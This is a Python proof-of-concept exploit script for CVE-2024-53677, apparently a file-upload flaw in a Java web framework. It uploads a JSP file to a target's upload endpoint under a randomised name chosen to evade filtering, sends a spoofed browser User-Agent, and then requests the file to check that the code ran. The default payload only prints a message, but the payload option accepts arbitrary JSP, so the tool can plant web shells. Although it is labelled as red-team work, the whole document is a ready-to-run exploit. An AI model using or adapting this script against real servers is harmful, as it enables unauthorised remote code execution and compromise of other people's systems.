import requests
import argparse
import random
import string
from urllib.parse import urljoin

def generate_random_filename(extension=".jsp"):
    """
    Generate a random filename to evade simple file filtering.
    """
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + extension

def upload_payload(target_url, upload_endpoint, payload, filename):
    """
    Upload the payload file to the target endpoint.
    """
    upload_url = urljoin(target_url, upload_endpoint)
    print(f"[INFO] Uploading payload to {upload_url}...")

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Connection": "close"
    }

    # Prepare malicious payload for upload
    files = {
        "upload": (filename, payload, "application/octet-stream")
    }

    try:
        response = requests.post(upload_url, files=files, headers=headers, timeout=10)
        if response.status_code == 200:
            print(f"[SUCCESS] File '{filename}' uploaded successfully.")
            return True
        elif response.status_code in [403, 401]:
            print(f"[WARNING] Upload blocked. HTTP {response.status_code}. Possible WAF or auth issue.")
        else:
            print(f"[ERROR] Upload failed. HTTP Status: {response.status_code}")
            print(f"[DEBUG] Response: {response.text[:200]}")
        return False
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Upload failed: {e}")
        return False

def verify_execution(target_url, filename):
    """
    Verify if the uploaded payload is accessible and executed.
    """
    payload_url = urljoin(target_url, filename)
    print(f"[INFO] Verifying payload execution at {payload_url}...")

    try:
        response = requests.get(payload_url, timeout=10)
        if response.status_code == 200 and "Exploit test successful!" in response.text:
            print(f"[ALERT] Exploit successful! Payload executed at: {payload_url}")
            return True
        elif response.status_code == 404:
            print(f"[INFO] File not found. Possible server-side restrictions.")
        else:
            print(f"[INFO] Unexpected response. HTTP Status: {response.status_code}")
            print(f"[DEBUG] Response: {response.text[:200]}")
        return False
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Verification failed: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="Red Team PoC Exploit for CVE-2024-53677")
    parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g., http://example.com)")
    parser.add_argument("--upload_endpoint", required=True, help="Path to the file upload endpoint (e.g., /fileUpload.action)")
    parser.add_argument("--payload", default="<% out.println('Exploit test successful!'); %>",
                        help="Custom JSP payload content (default prints a success message)")
    parser.add_argument("--filename", help="Custom filename for payload upload")
    args = parser.parse_args()

    print("[INFO] Starting CVE-2024-53677 Exploit...")
    target_url = args.url.rstrip("/")

    # Generate random filename if not specified
    filename = args.filename if args.filename else generate_random_filename()

    # Upload payload
    if upload_payload(target_url, args.upload_endpoint, args.payload, filename):
        # Verify execution
        verify_execution(target_url, filename)
    else:
        print("[ERROR] Exploit attempt failed.")

    print("[INFO] Exploit process completed.")

if __name__ == "__main__":
    main()
